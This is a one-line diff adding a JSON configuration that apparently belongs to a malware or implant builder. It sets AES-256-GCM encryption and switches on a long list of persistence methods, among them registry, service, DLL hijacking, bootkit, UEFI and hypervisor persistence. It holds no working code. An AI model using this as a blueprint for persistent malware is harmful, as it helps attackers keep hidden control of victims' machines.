@@ -1,0 +1,1 @@
+{"algorithm":"aes-256-gcm","ring3Persistence":true,"ring0Persistence":true,"startupPersistence":true,"registryPersistence":true,"servicePersistence":true,"dllHijackingPersistence":true,"bootkitPersistence":true,"uefiPersistence":true,"hypervisorPersistence":true}
